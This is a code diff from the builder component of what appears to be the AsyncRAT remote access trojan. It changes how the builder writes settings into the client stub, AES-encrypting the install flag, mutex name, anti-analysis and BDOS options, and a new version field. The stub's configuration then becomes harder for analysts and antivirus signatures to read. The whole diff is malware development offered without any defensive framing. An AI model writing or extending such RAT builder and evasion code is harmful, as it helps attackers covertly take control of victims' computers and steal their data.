@@ -153,22 +153,25 @@ namespace AsyncRAT_Sharp.Forms
                                     }
 
                                     if (operand == "%Install%")
-                                        methodDef.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();
+                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(checkBox1.Checked.ToString().ToLower());
 
                                     if (operand == "%Folder%")
                                         methodDef.Body.Instructions[i].Operand = comboBoxFolder.Text;
 
                                     if (operand == "%File%")
-                                        methodDef.Body.Instructions[i].Operand = textFilename.Text;
+                                        methodDef.Body.Instructions[i].Operand = textFilename.Text;                                  
+
+                                    if (operand == "%Version%")
+                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version);
 
                                     if (operand == "%Key%")
                                         methodDef.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));
 
                                     if (operand == "%MTX%")
-                                        methodDef.Body.Instructions[i].Operand = txtMutex.Text;
+                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(txtMutex.Text);
 
                                     if (operand == "%Anti%")
-                                        methodDef.Body.Instructions[i].Operand = chkAnti.Checked.ToString().ToLower();
+                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(chkAnti.Checked.ToString().ToLower());
 
                                     if (operand == "%Certificate%")
                                         methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
@@ -177,7 +180,7 @@ namespace AsyncRAT_Sharp.Forms
                                         methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
 
                                     if (operand == "%BDOS%")
-                                        methodDef.Body.Instructions[i].Operand = chkBdos.Checked.ToString().ToLower();
+                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(chkBdos.Checked.ToString().ToLower());
 
                                     if (operand == "%Pastebin%")
                                         if (chkPastebin.Checked)
